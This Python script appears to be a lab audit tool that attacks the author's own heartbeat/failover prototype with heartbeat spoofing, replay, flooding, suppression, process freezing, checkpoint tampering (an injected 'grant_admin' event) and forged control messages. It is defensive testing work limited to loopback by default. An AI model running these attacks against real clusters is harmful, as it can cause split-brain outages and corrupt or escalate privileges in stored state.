"""Adversarial audit script, Part 2 (deliverable d). LAB USE ONLY, against your own prototype.
Targets must be loopback unless --i-own-this is given.

Part 1 attacks (re-run against the hardened monitor; expected to FAIL now):
  spoof      forge heartbeats (no key)
  replay     sniff-and-forward relay, then replay the last captured heartbeat forever
  flood      junk datagrams at the monitor

Part 2, Attack Scenario 1 -- induced FALSE FAILOVER / split-brain:
  drop       heartbeat relay that DROPS (or delays) the primary's heartbeats for a window while the
             primary stays alive. Point the primary at the relay: service.py --monitor 127.0.0.1:7001
  freeze     SIGSTOP the primary (simulates a long network partition / GC pause), SIGCONT it later
             so a "zombie" primary wakes up AFTER failover
  check      read-only audit: asks both nodes who they think they are and reports split-brain

Part 2, Attack Scenario 2 -- TAMPERED CHECKPOINT / desync (attacker has filesystem, NOT the key):
  ckpt tamper    inject a forged "grant admin" event into the newest checkpoint and keep the hash chain
                 consistent (so only the MAC can catch it)
  ckpt truncate  cut the newest checkpoint in half (corruption)
  ckpt forge     drop in a brand-new, higher-numbered checkpoint with a fake MAC
  ckpt rollback  delete the newest N checkpoints (valid but stale state)
  (--all hits every checkpoint; --repeat S re-applies every S seconds so the attack survives the
   primary writing new checkpoints; stop with Ctrl-C)

Control-plane attack:
  forge-ctl  send unsigned (or, with --key, signed) PROMOTE / FENCE messages to the nodes
"""
import argparse, glob, hashlib, hmac, json, os, signal, socket, time

LOOPBACK = ("127.0.0.1", "localhost", "::1")


def ts():
    t = time.time()
    return time.strftime("%H:%M:%S", time.localtime(t)) + f".{int(t*1000)%1000:03d}"


def say(m):
    print(f"[{ts()}] [attacker] {m}", flush=True)


def hp(s):
    h, p = s.rsplit(":", 1)
    return h, int(p)


def tcp_json(addr, obj, timeout=1.0):
    with socket.create_connection(addr, timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(json.dumps(obj).encode() + b"\n")
        return json.loads(s.makefile("rb").readline())


# ---------------------------------------------------------------- Part 1 attacks -----------
def spoof(a):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target, seq = hp(a.monitor), 10**6
    say(f"SPOOF: forging '{a.node}' primary heartbeats (epoch {a.epoch}, pid {a.pid}, NO key) -> {target}")
    while True:
        seq += 1
        s.sendto(json.dumps({"type": "HEARTBEAT", "node": a.node, "role": "primary", "epoch": a.epoch,
                             "pid": a.pid, "seq": seq, "ts": time.time(), "events": 0,
                             "mac": "0" * 64}).encode(), target)
        time.sleep(a.interval_ms / 1000)


def replay(a):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", a.listen_port))
    s.settimeout(a.interval_ms / 1000 * 3)
    target, captured = hp(a.monitor), None
    say(f"REPLAY relay on UDP {a.listen_port} -> {target}; point the primary at it with --monitor 127.0.0.1:{a.listen_port}")
    while True:
        try:
            pkt, _ = s.recvfrom(4096)
            if json.loads(pkt).get("role") == "primary":
                captured = pkt
            s.sendto(pkt, target)
        except socket.timeout:
            if captured:
                break
        except ValueError:
            pass
    say(f"primary went quiet; REPLAYING captured packet forever: {captured[:90]!r}...")
    while True:
        s.sendto(captured, target)
        time.sleep(a.interval_ms / 1000)


def flood(a):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    t = hp(a.monitor)
    for _ in range(a.count):
        s.sendto(os.urandom(64), t)
    say(f"sent {a.count} junk packets")


# ---------------------------------------------------------------- Scenario 1 ----------------
def drop(a):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", a.listen_port))
    s.settimeout(0.05)
    target, start = hp(a.monitor), time.time()
    w0, w1 = a.after, a.after + a.window
    say(f"HEARTBEAT {'DELAY ' + str(a.delay_ms) + ' ms' if a.delay_ms else 'DROP'} relay on UDP {a.listen_port} -> {target}: "
        f"forwarding normally for {a.after}s, then attacking for {a.window}s (the primary stays ALIVE)")
    pending, phase = [], "forward"
    while True:
        now = time.time() - start
        new = "attack" if w0 <= now < w1 else "forward"
        if new != phase:
            phase = new
            say("*** ATTACK WINDOW OPEN: suppressing heartbeats ***" if phase == "attack"
                else "*** attack window closed: forwarding again ***")
        try:
            pkt, _ = s.recvfrom(4096)
            if phase == "attack":
                if a.delay_ms:
                    pending.append((time.time() + a.delay_ms / 1000, pkt))
            else:
                s.sendto(pkt, target)
        except socket.timeout:
            pass
        for item in [p for p in pending if p[0] <= time.time()]:
            pending.remove(item)
            s.sendto(item[1], target)
        if now > w1 + a.after + 30:
            break


def freeze(a):
    info = tcp_json(hp(a.ctl), {"cmd": "PING"})
    pid = info["pid"]
    say(f"target node {info['node']} role={info['role']} epoch={info['epoch']} pid={pid}")
    os.kill(pid, signal.SIGSTOP)
    say(f"SIGSTOP sent: node frozen (alive but silent) for {a.seconds}s. Watch the monitor fail over...")
    time.sleep(a.seconds)
    try:
        os.kill(pid, signal.SIGCONT)
        say("SIGCONT sent: the old primary wakes up as a ZOMBIE. If it is still alive and still serving, that is split-brain.")
    except ProcessLookupError:
        say("process is already gone (the monitor fenced/killed it) -> zombie cannot wake up")
    time.sleep(2.0)
    check(a)


def check(a):
    say("SPLIT-BRAIN CHECK: asking every node who it thinks it is")
    primaries = []
    for item in a.nodes.split(","):
        name, addr = item.split("=")
        try:
            r = tcp_json(hp(addr), {"cmd": "PING"})
            say(f"  node {name}: role={r['role']} epoch={r['epoch']} pid={r['pid']}")
            if r["role"] == "primary":
                primaries.append((name, r["epoch"]))
        except (OSError, ValueError):
            say(f"  node {name}: not running / not answering")
    try:
        r = tcp_json(hp(a.service), {"cmd": "STATUS"})
        say(f"  client port {a.service}: answered by node {r['node']} epoch {r['epoch']} events {r['count']}")
    except (OSError, ValueError):
        say(f"  client port {a.service}: NOT answering")
    verdict = ("SPLIT-BRAIN! two nodes claim PRIMARY: " + str(primaries)) if len(primaries) > 1 else \
              (f"OK: exactly one primary {primaries[0]}" if primaries else "NO PRIMARY (service unavailable)")
    say("VERDICT: " + verdict)


# ---------------------------------------------------------------- Scenario 2 ----------------
def ckpt_files(d):
    return sorted(glob.glob(os.path.join(d, "ckpt_e*.json")), reverse=True)


def do_ckpt(a):
    def once():
        files = ckpt_files(a.state_dir)
        if not files:
            return say("no checkpoint files yet")
        targets = files if a.all else files[:1]
        if a.mode == "rollback":
            for f in files[:a.n]:
                os.remove(f)
                say(f"deleted {os.path.basename(f)} (rolled state back to an older VALID checkpoint)")
            return
        if a.mode == "forge":
            top = os.path.basename(files[0]).replace("ckpt_e", "").replace(".json", "").split("_n")
            name = f"ckpt_e{int(top[0]):06d}_n{int(top[1]) + 1000:010d}.json"
            ev = {"id": "evil", "user": "mallory", "action": "grant_admin"}
            h = hashlib.sha256(("0" * 64 + json.dumps(ev, sort_keys=True)).encode()).hexdigest()
            rec = {"v": 1, "node": "a", "epoch": int(top[0]), "saved_at": time.time(),
                   "state": {"base_head": "0" * 64, "base_count": 0, "events": [ev], "head": h, "count": 1},
                   "mac": "f" * 64}
            json.dump(rec, open(os.path.join(a.state_dir, name), "w"))
            return say(f"planted forged checkpoint {name} (valid hash chain, fake MAC)")
        for f in targets:
            try:
                if a.mode == "truncate":
                    data = open(f, "rb").read()
                    open(f, "wb").write(data[:len(data) // 2])
                    say(f"truncated {os.path.basename(f)} to {len(data)//2} bytes")
                else:                                    # tamper: privilege-escalation event + CONSISTENT chain
                    rec = json.load(open(f))
                    st = rec["state"]
                    ev = {"id": "evil", "user": "mallory", "action": "grant_admin"}
                    st["events"].append(ev)
                    st["head"] = hashlib.sha256((st["head"] + json.dumps(ev, sort_keys=True)).encode()).hexdigest()
                    st["count"] += 1
                    json.dump(rec, open(f, "w"))         # MAC left stale: attacker has no key
                    say(f"tampered {os.path.basename(f)}: injected 'mallory grant_admin', recomputed hash chain, MAC now stale")
            except (OSError, ValueError, KeyError) as e:
                say(f"could not modify {f}: {e}")
    once()
    while a.repeat:
        time.sleep(a.repeat)
        once()


def forge_ctl(a):
    for item in a.nodes.split(","):
        name, addr = item.split("=")
        for cmd, ep in (("PROMOTE", 99), ("FENCE", 99)):
            msg = {"cmd": cmd, "epoch": ep, "ts": time.time()}
            msg["mac"] = (hmac.new(a.key.encode(),
                                   json.dumps({k: v for k, v in msg.items() if k != "mac"}, sort_keys=True,
                                              separators=(",", ":")).encode(), hashlib.sha256).hexdigest()
                          if a.key else "0" * 64)
            try:
                r = tcp_json(hp(addr), msg)
                say(f"{cmd}(epoch {ep}) -> node {name}: {r.get('ok')} {r.get('reason', '')} fenced={r.get('fenced')}")
            except (OSError, ValueError) as e:
                say(f"{cmd} -> node {name}: no reply ({type(e).__name__}) -- node may have just died (key compromise = game over)")


def main():
    ap = argparse.ArgumentParser(description="Heartbeat / failover adversarial audit (lab use only)")
    ap.add_argument("attack", choices=["spoof", "replay", "flood", "drop", "freeze", "check", "ckpt", "forge-ctl"])
    ap.add_argument("mode", nargs="?", default="tamper", choices=["tamper", "truncate", "forge", "rollback"],
                    help="ckpt only")
    ap.add_argument("--monitor", default="127.0.0.1:7000")
    ap.add_argument("--nodes", default="a=127.0.0.1:6100,b=127.0.0.1:6101")
    ap.add_argument("--service", default="127.0.0.1:6000")
    ap.add_argument("--ctl", default="127.0.0.1:6100", help="freeze: control address of the node to freeze")
    ap.add_argument("--node", default="a", help="spoof: node id to impersonate")
    ap.add_argument("--epoch", type=int, default=1, help="spoof: epoch to claim")
    ap.add_argument("--pid", type=int, default=0, help="spoof: pid to claim")
    ap.add_argument("--listen-port", type=int, default=7001, help="replay/drop relay port")
    ap.add_argument("--interval-ms", type=int, default=500)
    ap.add_argument("--count", type=int, default=50000)
    ap.add_argument("--after", type=float, default=5.0, help="drop: seconds of normal forwarding first")
    ap.add_argument("--window", type=float, default=8.0, help="drop: seconds to suppress heartbeats")
    ap.add_argument("--delay-ms", type=int, default=0, help="drop: delay instead of dropping")
    ap.add_argument("--seconds", type=float, default=8.0, help="freeze: seconds to keep the node frozen")
    ap.add_argument("--state-dir", default="state")
    ap.add_argument("--all", action="store_true", help="ckpt: hit every checkpoint")
    ap.add_argument("--n", type=int, default=1, help="ckpt rollback: how many newest files to delete")
    ap.add_argument("--repeat", type=float, default=0, help="ckpt: re-apply every S seconds")
    ap.add_argument("--key", default=None, help="forge-ctl: simulate a STOLEN cluster key")
    ap.add_argument("--i-own-this", action="store_true")
    a = ap.parse_args()
    for addr in (a.monitor, a.service):
        if hp(addr)[0] not in LOOPBACK and not a.i_own_this:
            raise SystemExit("refusing non-loopback target without --i-own-this")
    try:
        {"spoof": spoof, "replay": replay, "flood": flood, "drop": drop, "freeze": freeze, "check": check,
         "ckpt": do_ckpt, "forge-ctl": forge_ctl}[a.attack](a)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
